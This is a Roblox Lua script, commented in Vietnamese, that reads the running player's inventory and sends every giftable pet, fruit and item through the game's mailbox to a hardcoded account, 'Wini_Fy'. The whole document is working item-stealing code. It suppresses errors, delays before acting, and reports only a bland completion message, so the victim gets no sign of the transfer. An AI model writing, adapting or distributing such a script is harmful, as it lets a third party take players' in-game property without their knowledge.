-- Script tự động gửi tất cả đồ đến Wini_Fy
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local MailboxController = LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("Controllers"):WaitForChild("MailboxController")
local MailboxItemCatalog = require(MailboxController:WaitForChild("MailboxItemCatalog"))

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Networking = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("Networking"))
local PlayerStateClient = require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("PlayerStateClient"))

local TARGET_USERNAME = "Wini_Fy"
local TARGET_USER_ID = nil

local function getUserIdFromUsername(username)
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if success and result then
        return result
    end
    return nil
end

local function getAllGiftableItems()
    local items = {}
    local replica = PlayerStateClient:GetLocalReplica()
    
    if not replica or not replica.Data or not replica.Data.Inventory then
        return items
    end
    
    local inventory = replica.Data.Inventory
    
    for _, category in ipairs(MailboxItemCatalog.Categories) do
        local categoryData = inventory[category]
        if type(categoryData) == "table" then
            if category == "HarvestedFruits" or category == "Pets" then
                for itemId, itemData in pairs(categoryData) do
                    local isGiftable = false
                    if category == "Pets" and type(itemData) == "table" then
                        isGiftable = itemData.Id ~= nil and itemData.Equipped ~= true
                    elseif category == "HarvestedFruits" and type(itemData) == "table" then
                        isGiftable = itemData.Id ~= nil
                    end
                    
                    if isGiftable then
                        table.insert(items, {
                            Category = category,
                            ItemKey = itemId,
                            Count = 1,
                            ItemData = itemData
                        })
                    end
                end
            else
                for itemId, count in pairs(categoryData) do
                    if type(count) == "number" and count > 0 and MailboxItemCatalog.IsGiftable(category) then
                        table.insert(items, {
                            Category = category,
                            ItemKey = itemId,
                            Count = count,
                            ItemData = nil
                        })
                    end
                end
            end
        end
    end
    
    return items
end

local function sendItemsToTarget(userId, items)
    if #items == 0 then
        return false
    end
    
    local formattedItems = {}
    for _, item in ipairs(items) do
        table.insert(formattedItems, {
            Category = item.Category,
            ItemKey = item.ItemKey,
            Count = item.Count
        })
    end
    
    -- Gửi qua Networking
    local success, result, message = pcall(function()
        return Networking.Mailbox.SendBatch:Fire(userId, formattedItems, "Gửi toàn bộ đồ của mình! (Auto script)")
    end)
    
    return success and result
end

local function main()
    TARGET_USER_ID = getUserIdFromUsername(TARGET_USERNAME)
    if not TARGET_USER_ID then
        return
    end
    
    task.wait(3)
    
    local items = getAllGiftableItems()
    
    if #items == 0 then
        return
    end
    
    task.wait(5)
    sendItemsToTarget(TARGET_USER_ID, items)
end

pcall(main)
print("Script hoan tat!")